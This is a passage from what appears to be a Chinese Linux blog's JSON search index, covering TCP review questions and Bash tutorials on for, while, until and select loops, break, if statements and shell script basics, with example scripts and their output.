&#x2F;root&#x2F;tcpdump.txt#查看tcpdump抓包文件[root@root ~]# tcpdump -r tcpdump.txt 要求回顾答出下列问题：12345671. 回答TCP三次握手的过程和四次挥手的过程2. TCP 11种状态集的转换 closed --&gt;(创建socket)Listen监听状态3. soket五元组：协议（TCP UDP） 目标IP 目标端口 源IP 源端口4. ARP协议原理5. 传输层2种协议：TCP&#x2F;UDP6. TCP报文结构：源端口 目标端口字段 序列号 确认号 控制位信息（syn fin ack）","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"网络","slug":"网络","permalink":"https://garywu520.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"IP划分","slug":"IP划分","permalink":"https://garywu520.github.io/tags/IP%E5%88%92%E5%88%86/"}]},{"title":"期中架构-流程图","slug":"期中架构-流程图","date":"2017-07-29T09:45:07.000Z","updated":"2017-07-29T11:09:15.630Z","comments":true,"path":"2017/07/29/期中架构-流程图/","link":"","permalink":"https://garywu520.github.io/2017/07/29/%E6%9C%9F%E4%B8%AD%E6%9E%B6%E6%9E%84-%E6%B5%81%E7%A8%8B%E5%9B%BE/","excerpt":"业务架构流程图","text":"业务架构流程图","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"期中架构","slug":"期中架构","permalink":"https://garywu520.github.io/tags/%E6%9C%9F%E4%B8%AD%E6%9E%B6%E6%9E%84/"},{"name":"备份服务","slug":"备份服务","permalink":"https://garywu520.github.io/tags/%E5%A4%87%E4%BB%BD%E6%9C%8D%E5%8A%A1/"},{"name":"web服务","slug":"web服务","permalink":"https://garywu520.github.io/tags/web%E6%9C%8D%E5%8A%A1/"},{"name":"批量管理","slug":"批量管理","permalink":"https://garywu520.github.io/tags/%E6%89%B9%E9%87%8F%E7%AE%A1%E7%90%86/"}]},{"title":"Shell编程之Bash循环","slug":"Shell编程之Bash循环","date":"2017-07-24T12:37:09.000Z","updated":"2017-08-29T12:47:27.835Z","comments":true,"path":"2017/07/24/Shell编程之Bash循环/","link":"","permalink":"https://garywu520.github.io/2017/07/24/Shell%E7%BC%96%E7%A8%8B%E4%B9%8BBash%E5%BE%AA%E7%8E%AF/","excerpt":"for循环 for循环的基本语法： 123456for i in item1 item2 ... itemNdo command1 command2 ...done","text":"for循环 for循环的基本语法： 123456for i in item1 item2 ... itemNdo command1 command2 ...done 在for循环中，每次指定列表中的新值被赋予变量i后，for循环都会执行一次，它将重复运行do和done之间的所有语句，直到条件不满足时为止。 实例： 123456789101112131415要求：①找到已经开启服务 chkconfig --list|grep 3:on②需要开机自启的服务 crond sshd network rsyslog sysstat③for循环执行 chkconfig 服务名 off[root@oldboy202 scripts]#vim services.sh#&#x2F;bin&#x2F;bashservices&#x3D;&#96;chkconfig --list|grep 3:on |egrep -v &quot;crond|sshd|network|rsyslog|sysstat&quot; |awk &#39;&#123;print $1&#125;&#39;&#96; #把服务名称通过筛选然后定义一个变量；最后需要反引号进行括起来for i in $services #把服务名称列表变量赋值给i变量do chkconfig $i off #调用i变量done注：变量中如果包含单引号和双引号，那么此变量需要使用反引号括起来，否则会报错。 for循环练习1：批量创建10个用户，设置并显示用户随机密码 1234567891011121314151617181920212223242526272829303132vim useradd.sh#&#x2F;bin&#x2F;bashfor i in &#123;1..5&#125; #定义序列并将其赋值给变量i do useradd gary$i #创建用户 pass&#x3D;&#96;echo $RANDOM|md5sum|cut -c 1-8&#96; #生成随机密码，并将此赋值给变量pass echo $pass |passwd --stdin gary$i #为用户设置随机密码 echo $pass #显示用户随机密码done#################################################################执行结果：[root@oldboy202 scripts]# sh useradd.sh useradd: user &#39;gary1&#39; already existsChanging password for user gary1.passwd: all authentication tokens updated successfully.47608eeduseradd: user &#39;gary2&#39; already existsChanging password for user gary2.passwd: all authentication tokens updated successfully.5c50971buseradd: user &#39;gary3&#39; already existsChanging password for user gary3.passwd: all authentication tokens updated successfully.2997217duseradd: user &#39;gary4&#39; already existsChanging password for user gary4.passwd: all authentication tokens updated successfully.eefdc4c3注：echo $RANDOM|md5sum|cut -c 1-8可以生成5位随机数字，然后使用md5sum加密，最后通过cut命令获取8位字符 12345678扩展：批量删除用户#!&#x2F;bin&#x2F;bashfor i in &#123;1..10&#125;do userdel -r stu$i exit 0done for循环练习2：打印操作系统名称 12345678910111213141516#!&#x2F;bin&#x2F;bashfor linux in Redhat CentOS Gentoo Suse Fedora do echo &quot;The os is: $linux&quot; done############################################## 执行结果：[root@oldboy202 ~]# sh linux.sh The os is: RedhatThe os is: CentOSThe os is: GentooThe os is: SuseThe os is: Fedora for循环案例3：如果文件存在，则打印此文件，否则打印一个错误信息。 1234567891011121314151617vim file_check.conf#!&#x2F;bin&#x2F;bashfilenames&#x3D;&quot;&#x2F;etc&#x2F;yp.conf &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow &#x2F;etc&#x2F;gary.conf&quot;for file in $filenames do [[ -f $file ]] &amp;&amp; echo &quot;$file&quot; || echo &quot;Error: $file file not find&quot; done########################################执行结果[root@oldboy202 ~]# sh file_check.sh Error: &#x2F;etc&#x2F;yp.conf file not find&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;shadowError: &#x2F;etc&#x2F;gary.conf file not find for 循环案例4：使用命令替换的for循环实例 1234567891011121314[root@oldboy202 ~]# vim change.sh#!&#x2F;bin&#x2F;bashfor file in &#96;ls &#x2F;tmp&#x2F;*&#96; #把命令结果赋值给file变量；注：命令外是反引号 do echo $file #调用file变量done###########################################执行结果：[root@oldboy202 ~]# sh change.sh Printing file list in &#x2F;tmp dirctory:ls &#x2F;tmp&#x2F;etc-services-2017-07-05_18.tar.gz &#x2F;tmp&#x2F;oldboy.txt &#x2F;tmp&#x2F;swap_1000M &#x2F;tmp&#x2F;tar.log 案例5：for语句倒计时脚本-生成序列 1234567891011121314预备知识：seq 1 10 seq命令用于生成序列seq -w 10 -1 1 生成倒序数字（每次减一）；-w命令自动使用0补全；echo -n 意思是不换行echo -e参数是支持特殊字符&#x2F;b 退一格##########################################################[root@oldboy202 scripts]# vim daojishi.sh#&#x2F;bin&#x2F;bashfor i in &#96;seq -w 10 -1 1&#96; do echo -ne &quot;\\b\\b$i&quot; #此处需要使用双引号括起来，单引号会报错，因为单引号所见即所得 sleep 1done while循环 while循环用于重复的执行一个命令列表。语法如下： 123456789while [ 条件 ]do command1 command2 ... commandNdone即，当条件CONDITION为真时，command1...commandN命令将被执行。 实例： 123456789101112131415#!&#x2F;bin&#x2F;bashdeclare -i var #定义var为整型变量，目的是让变量值进行加减乘除等计算var&#x3D;1while [[ $var -le 3 ]] do echo &quot;The for loop is run $var times.&quot; var&#x3D;$var+1 #数值计算done#####################################执行结果[root@cm-master scripts]# sh while.sh The for loop is run 1 times.The for loop is run 2 times.The for loop is run 3 times. 案例1：【釜底抽薪法-逐行读取文件】将read命令和while循环来读取一个文本文件 123456789101112131415161718192021222324252627282930313233#!&#x2F;bin&#x2F;bashFilePath&#x3D;$1 #把位置参数1的值给变量fileif [[ $# -lt 1 ]];then #判断位置参数个数，如果小于1则打印错误提示并退出，同时返回错误码1 echo &quot;Usage: $0 FILEPATH.&quot; exit 1fiwhile read -r line #使用read命令从标准输入读取文件的一行，并赋值给变量hang do echo $line #打印读入的行done &lt; &quot;$FilePath&quot; 注释：我习惯把这种方式叫做read釜底抽薪，因为这种方式在结束的时候需要执行文件，就好像是执行完的时候再把文件读进去一样。################################[root@cm-master scripts]# sh while.sh &#x2F;etc&#x2F;fstab # &#x2F;etc&#x2F;fstab# Created by anaconda on Wed Jul 5 15:52:21 2017## Accessible filesystems, by reference, are maintained under &#39;&#x2F;dev&#x2F;disk&#39;# See man pages fstab(5), findfs(8), mount(8) and&#x2F;or blkid(8) for more info#&#x2F;dev&#x2F;mapper&#x2F;vg_cm5-lv_root &#x2F; ext4 defaults 1 1UUID&#x3D;f1c12bb9-1eb3-4c89-95c9-f8ca8ef1ce88 &#x2F;boot ext4 defaults 1 2&#x2F;dev&#x2F;mapper&#x2F;vg_cm5-lv_home &#x2F;home ext4 defaults 1 2&#x2F;dev&#x2F;mapper&#x2F;vg_cm5-lv_swap swap swap defaults 0 0tmpfs &#x2F;dev&#x2F;shm tmpfs defaults 0 0devpts &#x2F;dev&#x2F;pts devpts gid&#x3D;5,mode&#x3D;620 0 0sysfs &#x2F;sys sysfs defaults 0 0proc &#x2F;proc proc defaults 0 0 案例2：还可以按列读取文件的内容，将文件分为3列输出 1234567891011121314151617181920212223#!&#x2F;bin&#x2F;bashFilePath&#x3D;$1if [[ $# -lt 1 ]];then echo &quot;Usage: $0 FILEPATH.&quot;fiwhile read -r f1 f2 f3 #从文件内读取内容赋值给f1、f2和f3 do echo &quot;第一列: $f1;第二列: $f2;第三列: $f3&quot; #按照我们预定的格式输出done &lt; &quot;$FilePath&quot;##############################执行结果：第一列: #;第二列: ;第三列: 第一列: &#x2F;dev&#x2F;mapper&#x2F;vg_cm5-lv_root;第二列: &#x2F;;第三列: ext4 defaults 1 1第一列: UUID&#x3D;f1c12bb9-1eb3-4c89-95c9-f8ca8ef1ce88;第二列: &#x2F;boot;第三列: ext4 defaults 1 2第一列: &#x2F;dev&#x2F;mapper&#x2F;vg_cm5-lv_home;第二列: &#x2F;home;第三列: ext4 defaults 1 2第一列: &#x2F;dev&#x2F;mapper&#x2F;vg_cm5-lv_swap;第二列: swap;第三列: swap defaults 0 0第一列: tmpfs;第二列: &#x2F;dev&#x2F;shm;第三列: tmpfs defaults 0 0第一列: devpts;第二列: &#x2F;dev&#x2F;pts;第三列: devpts gid&#x3D;5,mode&#x3D;620 0 0第一列: sysfs;第二列: &#x2F;sys;第三列: sysfs defaults 0 0第一列: proc;第二列: &#x2F;proc;第三列: proc defaults 0 0 定义无限while循环(又称死循环) 一般当条件永远不被满足时，就会发生一个无限循环。 定义一个无限循环可以使用如下3种命令： true命令（也可以使用“:”） – 一直表示成功，给定语句将被执行。 false命令 – 不会执行任何语句，脚本/程序将跳转到done语句后的下一行。 实例1：使用“:” 定义一个无限循环 1234567891011121314151617#!&#x2F;bin&#x2F;bashwhile : do echo &quot;Do something...&quot; echo &quot;Hit [CTRL+C] to stop!&quot; sleep 3 #定义每次循环时间间隔,单位：秒done注：“:” 冒号命令是Bash的内部命令，也就意味着其他shell并不支持。#########################执行结果：[root@cm-master scripts]# sh xh.sh Do something...Hit [CTRL+C] to stop!Do something...Hit [CTRL+C] to stop! 实例2：使用“true” 定义一个无限循环 123456789#!&#x2F;bin&#x2F;bash#!&#x2F;bin&#x2F;bashwhile true do echo &quot;Do something...&quot; echo &quot;Hit [CTRL+C] to stop!&quot; sleep 2 #定义每次循环时间间隔,单位：秒done 实例3：使用while循环显示数字0-9 123456789101112131415161718192021#!&#x2F;bin&#x2F;basha&#x3D;0while [[ $a -lt 10 ]];do echo $a a&#x3D;&#96;expr $a + 1&#96;done###############################执行结果：[root@cm-master scripts]# sh num.sh 0123456789 expr手工命令计数器123456789101112131415161718expr命令一般用于整数值，但也可用于字符串。expr的常用运算符： 加法运算：+ 减法运算：- 乘法运算：\\* 除法运算：/ 比如：$ expr 10 + 1020$ expr 5 \\* 630$ expr 30 / 310$ expr 30 / 3 / 25(注意运算符左右都有空格)使用乘号时，必须用反斜线屏蔽其特定含义。因为shell可能会误解显示星号的意义 实例4：编写菜单驱动程序 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!&#x2F;bin&#x2F;bashwhile truedo clear echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; echo &quot; MAIN - 菜单 &quot; echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; echo &quot;1. 显示日期与时间.&quot; echo &quot;2. 显示系统信息.&quot; echo &quot;3. 显示用户正在做什么.&quot; echo &quot;4. Exit.&quot;read -p &quot;Enter your choice [1-4]：&quot; choice case $choice in 1) echo &quot;Today is $(date +%Y-%m-%d).&quot; echo &quot;Current time: $(date +%H:%M:%S)&quot; read -p &quot;Press [Enter] key to continue...&quot; readEnterkey ;; 2) uname -a read -p &quot;Press [Enter] key to continue...&quot; readEnterkey ;; 3) w read -p &quot;Press [Enter] key to continue...&quot; readEnterkey ;; 4) echo &quot;Bye!&quot; exit 0 ;; *) echo &quot;Error: Invalid option!&quot; read -p &quot;Press [Enter] key to continue...&quot; readEnterkey ;; esacdone###################################################################执行结果：&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; MAIN - 菜单 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;1. 显示 日期与时间.2. 显示系统信息.3. 显示用户正在做什么.4. Exit.Enter your choice [1-4]：3 19:01:53 up 6 days, 4:20, 1 user, load average: 0.27, 0.13, 0.07USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts&#x2F;0 10.255.255.1 15:37 0.00s 0.05s 0.00s sh menu.shPress [Enter] key to continue... until循环 until循环与while循环类似，也同样基于一个条件。但util循环的判断条件正好与while循环的判断条件相反。 until循环在条件为假的情况下才会继续运行; 一旦条件被满足，即为真，就会退出循环。 123456until [ CONDITION ]do command1 command2 ......done until循环与while循环相比： until循环执行直到返回0的状态就退出，因为0表示为真。 while循环执行知道返回非0状态就退出，因为非0表示为假。 until循环总是执行至少一次。 实例： 12345678910111213141516171819#!&#x2F;bin&#x2F;bashvar&#x3D;1until [ $var -gt 5 ]do echo &quot;The for loop is run $var times.&quot; var&#x3D;$(( var+1 ))done##########################执行结果：[root@CactiEZ ~]# sh until.sh The for loop is run 1 times.The for loop is run 2 times.The for loop is run 3 times.The for loop is run 4 times.The for loop is run 5 times.脚本会被执行5次，第6次条件被满足，则退出until循环。 select循环语句 bash还提供select循环，其语法如下所示： 123456select VAR in LISTdo command1 command2 ......done select循环语句具有如下特点： select语句使用Bash内部变量PS3的值作为它的提示信息。 打印到屏幕上的列表LIST中的每一项会在前面加上一个数字编号 当用户输入数字与某一个数字编号一致时，列表中相应的项即被赋予给变量VAR。 如果用户的内容为空，将重新显示列表LIST中的项和提示符信息。 可以通过添加一个退出选项，或按Ctrl+C或 Ctrl+D组合键退出select循环。 实例： 123456789101112131415161718192021222324252627282930313233343536373839#!&#x2F;bin&#x2F;bashPS3&#x3D;&quot;Run command: &quot; #定义PS3提示符select choice in date w hostname &quot;uname -a&quot; Exit #指定select循环列表do case $choice in date) echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; echo &quot;Current system date and time: &quot; echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; $choice #直接将变量的值作为命令运行 ;; w) echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; echo &quot;Who is logged on and what they are doing: &quot; echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; $choice ;; hostname) echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; echo &quot;Hostname: &quot; echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; $choice ;;&quot;uname -a&quot;) echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; echo &quot;System information: &quot; echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; $choice ;; Exit) echo &quot;Bye!&quot; exit ;; esacdone 执行结果 12345678910111213[root@CactiEZ ~]# sh select.sh 1) date2) w3) hostname4) uname -a5) ExitRun command: 1&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Current system date and time: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Wed Aug 23 16:43:49 CST 2017Run command: 5Bye! 循环控制 break和continue是Bash中的循环控制命令，其用法与在其他编程语言中的同名语句完全一致。 break语句 作用：break语句用于从for、while、until或select循环中退出，停止循环。 break语句的语法如下： 123break [n]n代表嵌套循环的层级，如果指定了n, break 将退出n级嵌套循环。如果没有指定或n不≥1，则退出状态码0，否则退出状态码为n. 实例： 123456789101112131415161718192021222324#!&#x2F;bin&#x2F;sh#如果未指定参数，则打印脚本的使用方法，并返回退出状态码1[ $# -eq 0 ] &amp;&amp; &#123; echo &quot;Usage: sh $0 file path&quot;; exit 1; &#125;#将位置1的值献给变量matchmatch&#x3D;$1found&#x3D;0#遍历目录&#x2F;etc下的所有文件for file in &#x2F;etc&#x2F;*do#如果文件的路径与指定的参数文件路径相匹配，则打印文件已找到，并退出for循环 if [ $file &#x3D;&#x3D; &quot;$match&quot; ];then echo &quot;The file $match was found!&quot; found&#x3D;1 #使用break退出for循环 break fidone[ $found -ne 1 ] &amp;&amp; echo &quot;the $match not found in &#x2F;etc directory.&quot; 执行结果： 12345678[root@CactiEZ ~]# sh break1.sh &#x2F;etc&#x2F;passwdThe file &#x2F;etc&#x2F;passwd was found![root@ ~]# sh break1.sh &#x2F;etc&#x2F;shadowThe file &#x2F;etc&#x2F;shadow was found![root@ ~]# sh break1.sh &#x2F;etc&#x2F;kkkthe &#x2F;etc&#x2F;kkk not found in &#x2F;etc directory. 实例2：使用break n语句退出嵌套循环 12345678910111213141516171819202122232425262728#!&#x2F;bin&#x2F;bash#如果未指定参数，则打印脚本的使用方法，并返回退出状态码1[[ $# -eq 0 ]] &amp;&amp; &#123; echo &quot;Usage: $0 command&quot;; exit 1; &#125;#将位置参数1的值赋给变量matchmatch&#x3D;$1found&#x3D;0for dir in &#x2F;bin &#x2F;usr&#x2F;bindo #遍历目录下的所有文件 for file in $dir&#x2F;* do #如果文件名与指定的参数文件名相匹配，则打印命令已找到，并退出嵌套的for循环。 if [[ $(basename $file) &#x3D;&#x3D; &quot;$match&quot; ]];then echo &quot;The command $match was found!&quot; found&#x3D;1 #退出两层的for循环 break 2 fi donedone[[ $found -ne 1 ]] &amp;&amp; echo &quot;The command $match not found.&quot; 测试 123[root@openvpn2]# cd &#x2F;bin[root@openvpn2 bin]# sh &#x2F;opt&#x2F;break.sh archThe command arch was found! 总结 什么叫shell循环？ 1shell 可以重复的执行特定指令，直到特定的条件被满足为止。这重复执行的一组命令就叫做循环。 shell循环特点 1循环条件中使用的变量必须是已初始化的，然后再循环中开始执行；在每一次循环开始时进行一次测试，重复的执行一个代码块。 for循环总结 1在for循环中，每次指定列表中的新值被赋给变量VAR后，for循环都会执行一次，它将重复运行do和done之间的所有语句，直到条件不满足时为止。 while循环总结 123451) while循环语句用于重复的执行一个命令列表2) while循环可以与read命令结合使用来读取一个文本文件3）while循环和专用命令&quot;:&quot;结合使用来定义一个无限循环定义一个无限循环可以使用3种命令：true命令、false命令和&quot;:&quot; 命令。 until循环总结 1until循环与while循环类似，也同样基于一个条件。但until循环的判断条件正好与while循环的判断条件相反，until循环在条件为假的情况下才会持续的运行。一旦条件被满足，即为真，就会退出循环。 select循环总结 123451) select语句使用Bash内置变量PS3的值作为它的提示符信息2）打印到屏幕上的列表LIST中的每一项会在前面加上一个数字编号3）当用户输入的数字与某一个数字编号一致时，列表中相应的项即被赋予变量VAR4）如果用户输入的为空，将重新显示列表LIST中的项和提示符信息。5）可以通过添加一个退出选项，或按Ctrl+C或Ctrl+D组合键退出select循环 break控制命令总结 123break是Bash中的循环控制命令，break语句用于从for、while、until或select循环中退出，停止循环的执行。使用break n将退出n级嵌套循环。注：break的英文意思是“打破”，即打破n级嵌套循环","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"break","slug":"break","permalink":"https://garywu520.github.io/tags/break/"},{"name":"for循环","slug":"for循环","permalink":"https://garywu520.github.io/tags/for%E5%BE%AA%E7%8E%AF/"},{"name":"while循环","slug":"while循环","permalink":"https://garywu520.github.io/tags/while%E5%BE%AA%E7%8E%AF/"},{"name":"until循环","slug":"until循环","permalink":"https://garywu520.github.io/tags/until%E5%BE%AA%E7%8E%AF/"},{"name":"select循环","slug":"select循环","permalink":"https://garywu520.github.io/tags/select%E5%BE%AA%E7%8E%AF/"}]},{"title":"shell if语句-条件执行","slug":"shell if语句-条件执行","date":"2017-07-19T13:46:06.000Z","updated":"2017-07-24T12:21:04.014Z","comments":true,"path":"2017/07/19/shell if语句-条件执行/","link":"","permalink":"https://garywu520.github.io/2017/07/19/shell%20if%E8%AF%AD%E5%8F%A5-%E6%9D%A1%E4%BB%B6%E6%89%A7%E8%A1%8C/","excerpt":"逻辑与（&amp;&amp;）只有当前一个命令执行成功时，才会执行后一个命令 逻辑或（||）只有当前一个命令执行失败时，才会执行后一个命令","text":"逻辑与（&amp;&amp;）只有当前一个命令执行成功时，才会执行后一个命令 逻辑或（||）只有当前一个命令执行失败时，才会执行后一个命令 实例：逻辑与（&amp;&amp;）也可以使用“逻辑与”操作符&amp;&amp;，将if语句中多个test命令连接在一起, 比如下面的例子 1234567891011if [ -n $var ] &amp;&amp; [ -e $var ];then echo &quot;\\$var is not null and a file named $var exists.&quot;fi或者if [[ -n $var &amp;&amp; -e $var ]];then echo &quot;\\$var is not null and a file named $var exists.&quot;fi 含义：判断只有当if条件中的变量$var值的长度不为0并且变量$var存在时，才会执行if语句中的内容 实例： 12345678910111213141516171819202122232425262728293031323334353637#!&#x2F;bin&#x2F;bashif [[ $# -ne 1 ]];then #判断如果指定的命令行参数个数不等于1，则输出使用方法并返回退出状态码1 echo &quot;Usage: sh $0 Number&quot;exit 1finum&#x3D;$1 #将第一个命令行参数赋值给变量numif [[ $num -ge 90 &amp;&amp; $num -lt 100 ]];then #如果$num大于等于90并且小于100，则打印Excellent! echo &quot;Excellent!&quot;elif [[ $num -ge 80 &amp;&amp; $num -lt 90 ]];then #如果$num大于等于80并且小于90，则打印Good! echo &quot;Good!&quot;elif [[ $num -ge 60 &amp;&amp; $num -lt 80 ]];then #如果$num大于等于60并且小于80，则打印Pass mark! echo &quot;Pass mark!&quot;elif [[ $num -lt 60 &amp;&amp; $num -ge 0 ]];then #如果$num小于60并且大于等于0，则打印Fail! echo &quot;Fail!&quot;else echo &quot;Wrong number!&quot; #如果$num都不满足以上条件，则打印Wrong number!fi注：上述脚本中，使用了“[[]]”代替了“[]”, 这样脚本内容会更佳简化##########################################################执行结果：[root@cm-master scripts]# sh shili.sh 90Excellent![root@cm-master scripts]# sh shili.sh 83Good![root@cm-master scripts]# sh shili.sh 75Pass mark![root@cm-master scripts]# sh shili.sh 64Pass mark![root@cm-master scripts]# sh shili.sh 36Fail![root@cm-master scripts]# sh shili.sh -1Wrong number! 实例：逻辑或（||） 逻辑或“||” 也是一个布尔操作符，语法如下： 123command1 || command2只有当command1返回非0状态时，才运行command2。换句话说就是，只有当command1执行失败，才会执行commond2 实例： 12345678910111213141516171819202122232425262728#!&#x2F;bin&#x2F;bashNOW&#x3D;&#96;date +%a&#96;if [[ &quot;$NOW&quot; &#x3D; &quot;Mon&quot; || &quot;$NOW&quot; &#x3D; &quot;Tue&quot; ]];then echo &quot;Please run full backup!&quot; exit 0 elif [[ &quot;$NOW&quot; &#x3D; &quot;Wed&quot; || &quot;$NOW&quot; &#x3D; &quot;Thu&quot; || &quot;$NOW&quot; &#x3D; &quot;Fri&quot; ]];then echo &quot;Please run incremental backup!&quot; exit 0 elif [[ &quot;$NOW&quot; &#x3D; &quot;Sat&quot; || &quot;$NOW&quot; &#x3D; &quot;Sun&quot; ]];then echo &quot;Don&#39;t need to backup!&quot; exit 0 else echo &quot;Wrong day!&quot; exit 1fi#############################执行结果：[root@cmm scripts]# sh checkDays.sh Please run full backup!代码释义：如果今天是周一或周二，则打印“Please run full backup!”；如果今天是周三、周四或周五，则打印“Please run incremental backup!”；如果今天是周六或周日，则打印“Don&#39;t need to backup!”；如果条件均不满足，则打印“Wrong day!” 实例：逻辑非（!） 逻辑非（!）同样是布尔操作符。它用于测试表达式是否为真或假。 实例： 12345678910#!&#x2F;bin&#x2F;bash[[ ! -d &#x2F;opt&#x2F;scripts ]] &amp;&amp; mkdir -p &#x2F;opt&#x2F;scripts || echo &quot;目录已经存在&quot; &amp;&amp; exit 4检查&#x2F;opt&#x2F;scripts目录是否存在，如果不存在，则创建该目录。如果存在，打印“目录已经存在并返回错误退出码4”#####################[root@cm-master scripts]# sh dir.sh 目录已经存在[root@cm-master scripts]# echo $?4","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"}]},{"title":"老男孩-day12-shell","slug":"老男孩-day12-shell编程","date":"2017-07-15T01:41:43.000Z","updated":"2017-07-24T13:45:42.362Z","comments":true,"path":"2017/07/15/老男孩-day12-shell编程/","link":"","permalink":"https://garywu520.github.io/2017/07/15/%E8%80%81%E7%94%B7%E5%AD%A9-day12-shell%E7%BC%96%E7%A8%8B/","excerpt":"什么是shell？123shell, 即命令解释器.由命令、变量和流程控制语句有机的结合CentOS默认shell是&#x2F;bin&#x2F;bash","text":"什么是shell？123shell, 即命令解释器.由命令、变量和流程控制语句有机的结合CentOS默认shell是&#x2F;bin&#x2F;bash 123echo &quot;df -h&quot;echo &quot;df -h&quot; |bash把字符交给bash去执行，然后返回结果。 脚本统一目录：mkdir -p /server/scripts 1234567891011$ vim oldboyedu.sh# 第一部分#!&#x2F;bin&#x2F;bash 必须写在首行，当然也可以写为#!&#x2F;bin&#x2F;sh(CentOS下&#x2F;bin&#x2F;sh是bash的软链)# description: 注释。除第一行外，跟在#后面的就可以叫做注释（建议英文注释）# 第二部分-变量段例：dir&#x3D;&#x2F;usr&#x2F;var# 第三部分-命令段cd $dir 123456789101112131415161718192021脚本添加版权信息cd &#x2F;root 在当前宿主目录下创建.vimrc文件vim .vimrc 编辑此文件，添加如下信息保存autocmd BufNewFile *.py,*.cc,*.sh,*.java exec &quot;:call SetTitle()&quot;func SetTitle() if expand(&quot;%:e&quot;) &#x3D;&#x3D; &#39;sh&#39; call setline(1,&quot;#!&#x2F;bin&#x2F;bash&quot;) call setline(2, &quot;##############################################################&quot;) call setline(3, &quot;# File Name: &quot;.expand(&quot;%&quot;)) call setline(4, &quot;# Version: V1.0&quot;) call 